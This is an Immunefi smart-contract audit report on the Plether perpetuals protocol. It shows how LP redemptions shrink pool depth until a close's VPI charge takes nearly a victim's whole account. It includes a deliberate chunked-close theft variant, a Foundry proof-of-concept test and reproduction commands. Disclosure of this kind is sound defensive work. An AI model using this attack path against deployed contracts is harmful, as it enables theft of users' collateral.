# \#99626 [SC-High] Close VPI is unbounded as depth shrinks, and the charge reaches the closer's entire account

**Submitted on Nov 14th 2026 at 14:51:42 UTC by @Norah for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99626
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro
Every voluntary close pays a fresh VPI charge:

```
charge = 0.5 * k * (postSkew² − preSkew²) / depth,   depth = pool assets − trader claims
```

The protocol knows this formula misbehaves when depth disappears. Its only guard is a check that depth is exactly zero (`CloseAccountingLib.sol:107`). At a depth of 62.69 USDG, the same close that costs 430 at healthy depth costs over 100 million. Nothing relates the charge to the closed notional or to the closer's account.

Then the charge is collected from far more than the position. The planner withholds the price gain, takes the action reserve, then the account's entire free settlement balance, then the released margin, then committed order margin (`CfdEnginePlanLib.sol:1093-1137`). Whatever is left is waived, and the close still executes. Idle collateral that never backed the position is taken.

Depth can collapse to a small fraction of skew without anyone doing anything wrong. LPs may redeem until pool cash reaches the worst-case liability plus buffer, and a majority SHORT opened near the price cap has a tiny worst-case liability while its notional, which is the skew, is large. Ordinary LP redemptions are enough. No attacker, no deficit, no price move.


## Vulnerability Details
1. `CloseAccountingLib.buildCloseState` (`CloseAccountingLib.sol:105-111`) computes fresh VPI through `CfdMath.calculateVPI` unless `poolDepthAssets == 0` exactly. There is no other bound.
2. Close-side depth is `computeNetPoolDepthAssets(snap.poolAssets, snap.totalTraderClaimBalanceAssets)` (`CfdEnginePlanLib.sol:1338-1341`, `PositionRiskAccountingLib.sol:21-25`): physical assets net of trader claims, nothing else.
3. A minority-side close increases |skew|, so the charge is positive and grows as 1/depth.
4. Collection order in `_planCloseCashSources`: withheld gain, VPI-rebate reserve, spendable action reserve, all free settlement, released margin, committed order margin, remainder waived.
5. A victim who instead bounds the charge with the order's `maxActionChargeAssets` cannot close at all. While the engine is degraded, `validateWithdraw` reverts any withdrawal from an account with an open position (`CfdEngineSettlementSidecar.sol:262-269`), and `clearDegradedMode` requires the owner to restore full solvency first (`CfdEngine.sol:658-667`).

Carry reads the same small-depth input and stays safe because its utilization is capped at 100% (`PositionRiskAccountingLib` carry math). VPI has no such cap. That difference is the bug.

## Attack path (no attacker needed for the bounded variant)

Pool 10M (Senior 5M, Junior 5M). A trader opens a 2,000,000-token SHORT at 1.99, near the 2.00 cap: notional about 3.98M, worst-case liability only 20k (cap minus entry, per token). The victim opens a small LONG, 50,000 tokens at 1.99, notional 99,500, with 500 margin and 40,000 idle free settlement. Net skew is about 3.88M, under the 40%-of-depth open cap at 10M depth.

1. LPs redeem everything they are allowed to. The reserve floor is the worst-case liability plus buffer, so roughly 9.9M leaves the pool. Depth falls to 99,748.75 against a skew of 3.88M.
2. The victim closes at the same price. PnL is zero, which isolates the charge. Charge = 0.5 · 0.01 · (3.98M² − 3.88M²) / 99,749 ≈ 39,244.
3. The planner collects from the victim's 40,000 idle balance and the released margin. The victim ends with 1,606.58 of a 40,850.87 account. 96% confiscated, no claim recorded for the shortfall.

The same close at the pre-redemption depth costs 430.49, or 0.43% of notional. The 91x difference is entirely the depth term.

The same primitive extends to a deliberate variant. In a deficit pool, a winning trader chunks its closes, each paid in cash while it fits under `_payOrRecordTraderClaim`'s cash-net-of-claims rule (`CfdEngine.sol:840-871`), and grinds depth down to dust without ever hitting exactly zero. A minority-side closer queued behind them is then confiscated to zero, and the confiscated cash converts the winner's unbacked claim into withdrawable funds.

## Impact

- Healthy depth: close cost 430.49 on 99,500 notional.
- After ordinary LP redemptions: 39,244.30 confiscated out of a 40,850.87 account, idle collateral included, close executed at an unchanged price, no claim recorded.
- In the deficit variant the loss reaches the victim's entire account, idle collateral included, and the confiscated cash is withdrawn by the winner whose chunked closes created the dust depth.

## Why this is not a known issue

The SECURITY.md VPI limitations say two things on this topic: VPI uses depth net of claims, and zero depth creates no fresh charge. Neither bounds the charge at small non-zero depth. SCAN-30 and SCAN-31 describe a trader moving depth to change its own charge or rebate within normal bounds. Neither describes depth collapse pushing another user's close charge past that user's entire account, and neither touches collection from idle collateral. The carry-side utilization cap shows the protocol bounds this input class elsewhere; VPI is missing it.

## Recommendation

Bound positive close VPI by using `max(depth, preSkew)` as the denominator, or cap the charge at roughly `vpiFactor` times the closed notional. Normal pools are unchanged, and the 0-versus-1-atom cliff disappears. Separately, limit a voluntary close's action charge to the position's own gain and margin, so a pricing error can never reach collateral that did not back the position. Skipping fresh close VPI while degraded, matching the zero-depth intent, is a reasonable additional safeguard.

## References
Add any relevant links to documentation or code


## Proof of Concept

The PoC is a single Foundry test file with two tests on the same setup. The first closes the victim's position at healthy depth and prices the cost. The second has the LPs redeem down to the reserve floor through the public vault entrypoints, then runs the identical close at an unchanged price and measures what leaves the victim's account. It runs on the repository's own fixtures (`BasePerpTest`, its mock settlement token, and the Router-prank order helpers used throughout the project's suite). No file under `src/` is modified, and there is no fuzzing.

To reproduce:

```bash
# 1. Frozen checkout (Foundry Forge 1.5.1, Solidity 0.8.35, via-IR)
git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8

# 2. Save the source at the end of this report as packages/perps/test/poc/Crit02_DustDepthCloseVpi.t.sol

# 3. Run it
forge test --root packages/perps --match-path 'test/poc/Crit02_DustDepthCloseVpi.t.sol' -vv
```

The first compile covers the whole perps package under via-IR and takes several minutes. To compile only the PoC directory instead, prefix the same command with `FOUNDRY_TEST=test/poc` and add `--skip script`, which is how the numbers below were produced.

Expected output, all passing:

```

[PASS] test_PLETHER_Crit02_CloseAtHealthyDepth_Cheap()
  victim balance before: 40850.872382
  victim balance after : 40420.379151
  close cost (VPI+fee) : 430.493231
[PASS] test_PLETHER_Crit02_AfterLpExit_CloseConfiscatesEntireAccount()
  pool depth after LP exit: 99748.750000
  victim account before   : 40850.872382
  victim account after    : 1606.576806
  amount confiscated      : 39244.295576
```

Reading the output: the identical close costs 430.49 with the pool intact and 39,244.30 after ordinary LP redemptions, a 91x difference produced entirely by the depth term of the VPI formula. The close executes at an unchanged price, so price PnL is zero and the charge is isolated. The victim ends with 1,606.58 of a 40,850.87 account, and no trader claim is recorded for the shortfall, which the test asserts directly.

### PoC source (`packages/perps/test/poc/Crit02_DustDepthCloseVpi.t.sol`)

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";

/// @notice Crit 02: the fresh VPI charged on a close is 0.5 * k * (postSkew^2 - preSkew^2) / depth
///         with depth = pool assets net of trader claims, and is skipped only when depth is
///         exactly zero. Nothing bounds the charge against the closed notional or the account.
///         A majority SHORT opened near the price cap has a small worst-case liability, so LPs
///         may redeem almost all pool cash; skew stays large and the minority-side closer's
///         charge explodes, collecting the account's entire free settlement (idle collateral).
contract PocCrit02DustDepthCloseVpiTest is BasePerpTest {
    address internal constant SHORT_TRADER = address(0x5B0B7);
    address internal constant VICTIM = address(0x91C7);

    // Release parameters.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    /// @dev Baseline: the same close at healthy depth (~10M) costs well under 1% of notional.
    function test_PLETHER_Crit02_CloseAtHealthyDepth_Cheap() public {
        _setupPositions();
        uint256 before = clearinghouse.balanceAssets(VICTIM);

        _close(VICTIM, CfdTypes.Side.LONG, 50_000e18, 1.99e8);

        uint256 balAfter = clearinghouse.balanceAssets(VICTIM);
        emit log_named_decimal_uint("victim balance before", before, 6);
        emit log_named_decimal_uint("victim balance after ", balAfter, 6);
        emit log_named_decimal_uint("close cost (VPI+fee) ", before - balAfter, 6);
        // ~391 VPI + ~40 fee on a 99,500 notional: under 1%.
        assertLt(before - balAfter, 1_000e6, "healthy-depth close must stay under 1% of notional");
    }

    /// @dev LPs redeem down to the settlement floor (an ordinary, allowed redemption), then
    ///      the identical close at an unchanged price confiscates the victim's whole account,
    ///      including idle collateral that never backed the position.
    function test_PLETHER_Crit02_AfterLpExit_CloseConfiscatesEntireAccount() public {
        _setupPositions();
        _lpRedeemEverything();

        uint256 depth = pool.totalAssets();
        uint256 before = clearinghouse.balanceAssets(VICTIM);
        emit log_named_decimal_uint("pool depth after LP exit", depth, 6);
        emit log_named_decimal_uint("victim account before   ", before, 6);

        _close(VICTIM, CfdTypes.Side.LONG, 50_000e18, 1.99e8);

        uint256 balAfter = clearinghouse.balanceAssets(VICTIM);
        emit log_named_decimal_uint("victim account after    ", balAfter, 6);
        emit log_named_decimal_uint("amount confiscated      ", before - balAfter, 6);

        // Notional is 99,500; the victim funded 40,500 (500 margin + 40,000 idle).
        // The unbounded close VPI takes essentially the whole account: 39,244 of 40,850,
        // including all idle collateral (the same close costs 430 at healthy depth).
        assertGt(before - balAfter, 39_000e6, "close must take essentially the whole account");
        assertLe(balAfter, 2_000e6, "idle collateral is confiscated");
        assertEq(engine.traderClaimBalanceAssets(VICTIM), 0, "no claim is created for the charge");
    }

    /// @dev Pool 10M (senior 5M / junior 5M); SHORT_TRADER short 2M tokens at 1.99 (near the
    ///      2.00 cap, so its worst-case liability is only 20k); VICTIM long 50k tokens at 1.99
    ///      with 500 margin and 40,000 idle free settlement. Net skew ~3.88M (39% of depth).
    function _setupPositions() private {
        _fundSenior(address(this), 5_000_000e6);
        _fundJunior(address(this), 5_000_000e6);
        _fundTrader(SHORT_TRADER, 200_000e6);
        _fundTrader(VICTIM, 40_500e6);

        _open(SHORT_TRADER, CfdTypes.Side.SHORT, 2_000_000e18, 60_000e6, 1.99e8);
        _open(VICTIM, CfdTypes.Side.LONG, 50_000e18, 500e6, 1.99e8);

        // 1h deposit cooldown before LP redemption requests are allowed.
        vm.warp(block.timestamp + 1 hours + 1);
    }

    /// @dev LPs exercise their ordinary redemption right down to the reserve floor.
    function _lpRedeemEverything() private {
        vm.startPrank(address(this));
        seniorVault.requestRedeem(seniorVault.maxRequestRedeem(address(this)), address(this), address(this));
        juniorVault.requestRedeem(juniorVault.maxRequestRedeem(address(this)), address(this), address(this));
        vm.stopPrank();

        (uint256 epoch,) = juniorVault.getRequestEpochWindow();
        uint256 target = pool.lpEpochStart(epoch) + 1;
        if (target <= block.timestamp) {
            target = block.timestamp + 1 hours + 1;
        }
        vm.warp(target);
        uint256 markPrice = engine.lastMarkPrice();
        vm.prank(address(router));
        engine.updateMarkPrice(markPrice == 0 ? 1e8 : markPrice, uint64(vm.getBlockTimestamp()));
        _settleLpEpochForTest();
    }
}
```
